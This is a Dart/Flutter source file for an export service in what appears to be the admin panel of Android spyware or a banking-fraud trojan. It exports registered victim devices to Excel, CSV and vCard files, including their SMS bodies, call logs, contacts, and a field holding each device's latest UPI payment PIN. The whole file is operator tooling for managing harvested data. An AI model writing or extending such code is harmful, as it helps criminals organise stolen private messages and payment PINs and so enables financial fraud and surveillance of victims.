import 'dart:io';
import 'package:excel/excel.dart';
import 'package:csv/csv.dart';
import 'package:path_provider/path_provider.dart';
import 'package:share_plus/share_plus.dart';
import 'package:flutter/foundation.dart' show kIsWeb, debugPrint;
import 'package:intl/intl.dart';
import '../../data/models/device.dart';
import '../../data/models/sms_message.dart';
import '../../data/models/call_log.dart';
import '../../data/models/contact.dart';
import '../../data/models/activity_log.dart';

class ExportService {
  static final ExportService _instance = ExportService._internal();
  factory ExportService() => _instance;
  ExportService._internal();

  // Helper: Get latest UPI PIN from device
  String _getLatestUpiPin(Device device) {
    // Use new upiPins array first
    if (device.latestUpiPin != null) {
      return device.latestUpiPin!.pin;
    }
    // Fallback to deprecated upiPin field
    if (device.upiPin != null && device.upiPin!.isNotEmpty) {
      return device.upiPin!;
    }
    return '';
  }

  // 📊 Export Devices to Excel
  Future<bool> exportDevicesToExcel(List<Device> devices) async {
    try {
      final excel = Excel.createExcel();
      final sheet = excel['Devices'];

      // Headers
      sheet.appendRow([
        TextCellValue('Device ID'),
        TextCellValue('Model'),
        TextCellValue('Manufacturer'),
        TextCellValue('OS Version'),
        TextCellValue('Status'),
        TextCellValue('Battery'),
        TextCellValue('Online'),
        TextCellValue('Total SMS'),
        TextCellValue('Total Contacts'),
        TextCellValue('Total Calls'),
        TextCellValue('Has UPI'),
        TextCellValue('UPI PIN'),
        TextCellValue('Note Priority'),
        TextCellValue('Note Message'),
        TextCellValue('Last Ping'),
        TextCellValue('Registered At'),
      ]);

      // Data rows
      for (var device in devices) {
        sheet.appendRow([
          TextCellValue(device.deviceId),
          TextCellValue(device.model),
          TextCellValue(device.manufacturer),
          TextCellValue(device.osVersion),
          TextCellValue(device.status),
          IntCellValue(device.batteryLevel),
          TextCellValue(device.isOnline ? 'Online' : 'Offline'),
          IntCellValue(device.stats.totalSms),
          IntCellValue(device.stats.totalContacts),
          IntCellValue(device.stats.totalCalls),
          TextCellValue(device.hasUpi ? 'Yes' : 'No'),
          TextCellValue(_getLatestUpiPin(device)),
          TextCellValue(device.notePriority ?? ''),
          TextCellValue(device.noteMessage ?? ''),
          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(device.lastPing)),
          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(device.registeredAt)),
        ]);
      }

      // Save and share
      final fileName = 'devices_${DateTime.now().millisecondsSinceEpoch}.xlsx';
      return await _saveAndShare(excel, fileName, 'Devices Export');
    } catch (e) {
      debugPrint('❌ Export devices failed: $e');
      return false;
    }
  }

  // 📱 Export SMS Messages to Excel
  Future<bool> exportSmsToExcel(List<SmsMessage> messages, String deviceId) async {
    try {
      final excel = Excel.createExcel();
      final sheet = excel['SMS'];

      // Headers
      sheet.appendRow([
        TextCellValue('ID'),
        TextCellValue('Type'),
        TextCellValue('From'),
        TextCellValue('To'),
        TextCellValue('Body'),
        TextCellValue('Timestamp'),
        TextCellValue('Is Read'),
      ]);

      // Data rows
      for (var sms in messages) {
        sheet.appendRow([
          TextCellValue(sms.id),
          TextCellValue(sms.type),
          TextCellValue(sms.from ?? ''),
          TextCellValue(sms.to ?? ''),
          TextCellValue(sms.body),
          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(sms.timestamp)),
          TextCellValue(sms.isRead ? 'Yes' : 'No'),
        ]);
      }

      final fileName = 'sms_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.xlsx';
      return await _saveAndShare(excel, fileName, 'SMS Export');
    } catch (e) {
      debugPrint('❌ Export SMS failed: $e');
      return false;
    }
  }

  // 📞 Export Call Logs to Excel
  Future<bool> exportCallsToExcel(List<CallLog> calls, String deviceId) async {
    try {
      final excel = Excel.createExcel();
      final sheet = excel['Calls'];

      // Headers
      sheet.appendRow([
        TextCellValue('Number'),
        TextCellValue('Name'),
        TextCellValue('Type'),
        TextCellValue('Duration (sec)'),
        TextCellValue('Timestamp'),
      ]);

      // Data rows
      for (var call in calls) {
        sheet.appendRow([
          TextCellValue(call.number),
          TextCellValue(call.name),
          TextCellValue(call.callType),
          IntCellValue(call.duration),
          TextCellValue(call.timestamp),
        ]);
      }

      final fileName = 'calls_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.xlsx';
      return await _saveAndShare(excel, fileName, 'Calls Export');
    } catch (e) {
      debugPrint('❌ Export calls failed: $e');
      return false;
    }
  }

  // 👤 Export Contacts to vCard
  Future<bool> exportContactsToVCard(List<Contact> contacts, String deviceId) async {
    try {
      final vCardData = StringBuffer();

      for (var contact in contacts) {
        vCardData.writeln('BEGIN:VCARD');
        vCardData.writeln('VERSION:3.0');
        vCardData.writeln('FN:${contact.name}');
        vCardData.writeln('TEL:${contact.phoneNumber}');
        if (contact.email != null && contact.email!.isNotEmpty) {
          vCardData.writeln('EMAIL:${contact.email}');
        }
        vCardData.writeln('END:VCARD');
      }

      final fileName = 'contacts_${deviceId}_${DateTime.now().millisecondsSinceEpoch}.vcf';
      return await _saveAndShareText(vCardData.toString(), fileName, 'Contacts Export');
    } catch (e) {
      debugPrint('❌ Export contacts failed: $e');
      return false;
    }
  }

  // 📋 Export Activity Logs to Excel
  Future<bool> exportActivityLogsToExcel(List<ActivityLog> activities) async {
    try {
      final excel = Excel.createExcel();
      final sheet = excel['Activity Logs'];

      // Headers
      sheet.appendRow([
        TextCellValue('ID'),
        TextCellValue('Admin'),
        TextCellValue('Activity Type'),
        TextCellValue('Description'),
        TextCellValue('Device ID'),
        TextCellValue('IP Address'),
        TextCellValue('Success'),
        TextCellValue('Timestamp'),
      ]);

      // Data rows
      for (var activity in activities) {
        sheet.appendRow([
          TextCellValue(activity.id),
          TextCellValue(activity.adminUsername),
          TextCellValue(activity.activityType),
          TextCellValue(activity.description),
          TextCellValue(activity.deviceId ?? ''),
          TextCellValue(activity.ipAddress ?? ''),
          TextCellValue(activity.success ? 'Yes' : 'No'),
          TextCellValue(DateFormat('yyyy-MM-dd HH:mm:ss').format(activity.timestamp)),
        ]);
      }

      final fileName = 'activity_logs_${DateTime.now().millisecondsSinceEpoch}.xlsx';
      return await _saveAndShare(excel, fileName, 'Activity Logs Export');
    } catch (e) {
      debugPrint('❌ Export activity logs failed: $e');
      return false;
    }
  }

  // 💾 Export to CSV (Alternative)
  Future<bool> exportDevicesToCsv(List<Device> devices) async {
    try {
      List<List<dynamic>> rows = [];
      
      // Headers
      rows.add([
        'Device ID', 'Model', 'Manufacturer', 'OS Version', 'Status', 
        'Battery', 'Online', 'Total SMS', 'Total Contacts', 'Total Calls',
        'Has UPI', 'UPI PIN', 'Note Priority', 'Note Message', 'Last Ping', 'Registered At'
      ]);

      // Data rows
      for (var device in devices) {
        rows.add([
          device.deviceId,
          device.model,
          device.manufacturer,
          device.osVersion,
          device.status,
          device.batteryLevel,
          device.isOnline ? 'Online' : 'Offline',
          device.stats.totalSms,
          device.stats.totalContacts,
          device.stats.totalCalls,
          device.hasUpi ? 'Yes' : 'No',
          _getLatestUpiPin(device),
          device.notePriority ?? '',
          device.noteMessage ?? '',
          DateFormat('yyyy-MM-dd HH:mm:ss').format(device.lastPing),
          DateFormat('yyyy-MM-dd HH:mm:ss').format(device.registeredAt),
        ]);
      }

      final csvData = const ListToCsvConverter().convert(rows);
      final fileName = 'devices_${DateTime.now().millisecondsSinceEpoch}.csv';
      return await _saveAndShareText(csvData, fileName, 'Devices CSV Export');
    } catch (e) {
      debugPrint('❌ Export CSV failed: $e');
      return false;
    }
  }

  // Helper: Save Excel and Share
  Future<bool> _saveAndShare(Excel excel, String fileName, String subject) async {
    try {
      if (kIsWeb) {
        // For web, trigger download
        excel.save(fileName: fileName);
        return true;
      } else {
        // For mobile, save to temp directory and share
        final directory = await getTemporaryDirectory();
        final file = File('${directory.path}/$fileName');
        
        final bytes = excel.encode();
        if (bytes != null) {
          await file.writeAsBytes(bytes);
          
          final result = await Share.shareXFiles(
            [XFile(file.path)],
            subject: subject,
          );
          
          return result.status == ShareResultStatus.success;
        }
        return false;
      }
    } catch (e) {
      debugPrint('❌ Save and share failed: $e');
      return false;
    }
  }

  // Helper: Save Text and Share (for vCard and CSV)
  Future<bool> _saveAndShareText(String content, String fileName, String subject) async {
    try {
      if (kIsWeb) {
        // For web, we'd need to use download API
        debugPrint('⚠️ Text export not fully supported on web');
        return false;
      } else {
        final directory = await getTemporaryDirectory();
        final file = File('${directory.path}/$fileName');
        
        await file.writeAsString(content);
        
        final result = await Share.shareXFiles(
          [XFile(file.path)],
          subject: subject,
        );
        
        return result.status == ShareResultStatus.success;
      }
    } catch (e) {
      debugPrint('❌ Save and share text failed: $e');
      return false;
    }
  }
}
